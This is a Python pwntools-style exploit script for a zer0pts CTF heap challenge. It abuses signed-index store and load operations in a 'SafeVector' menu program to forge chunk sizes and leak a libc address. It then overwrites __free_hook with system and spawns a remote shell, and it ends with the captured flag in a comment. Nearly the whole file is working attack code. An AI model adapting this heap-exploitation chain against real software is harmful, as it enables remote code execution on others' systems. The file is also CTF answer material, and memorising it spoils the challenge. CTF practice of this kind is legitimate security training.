#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn.ctf.zer0pts.com', 'port':9001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    sv = SafeVector(conn)

    for i in range(0x7e):
        sv.push(i)
    sv.push(0x11)
    sv.wipe()

    for i in range(0x20//4):
        sv.push(i)
    sv.store(-2, 0x421)
    sv.wipe()

    sv.push(0)
    for i in range(1+ 0x48//4):
        sv.pop()

    leak  = sv.load(0x40//4)
    leak += sv.load(0x44//4) << 32
    sv.wipe()

    addr_libc_mainarena = leak - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    for i in range(0x30//4):
        sv.push(i)
    sv.store(-2, 0x31)
    sv.wipe()

    sv.push(0)
    for i in range(1+ 0x78//4):
        sv.pop()
    sv.store(0x70//4, u32(p32((addr_libc_free_hook-8) & ((1<<32)-1)), sign=True))
    sv.store(0x74//4, addr_libc_free_hook >> 32)
    sv.wipe()

    for i in range(0x20//4):
        sv.push(i)
    sv.store(-2, 0x51)
    sv.wipe()

    sv.push(u16(b'sh'))
    sv.push(0)
    sv.push(u32(p32(addr_libc_system & ((1<<32)-1)), sign=True))
    sv.push(addr_libc_system >> 32)
    sv.push(0)

class SafeVector:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def push(self, val):
        self.sendlineafter('>> ', '1')
        self.sendlineafter('value: ', str(val))

    def pop(self):
        self.sendlineafter('>> ', '2')

    def store(self, idx, val):
        self.sendlineafter('>> ', '3')
        self.sendlineafter('index: ', str(idx))
        self.sendlineafter('value: ', str(val))

    def load(self, idx):
        self.sendlineafter('>> ', '4')
        self.sendlineafter('index: ', str(idx))
        self.recvuntil('value: ')
        return int(self.recvuntil('\n', drop=True))

    def wipe(self):
        self.sendlineafter('>> ', '5')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # zer0pts{B3_4W4R3_0F_S1GN3D_M0DUL0!!!}

if __name__=='__main__':
    main()

#==========
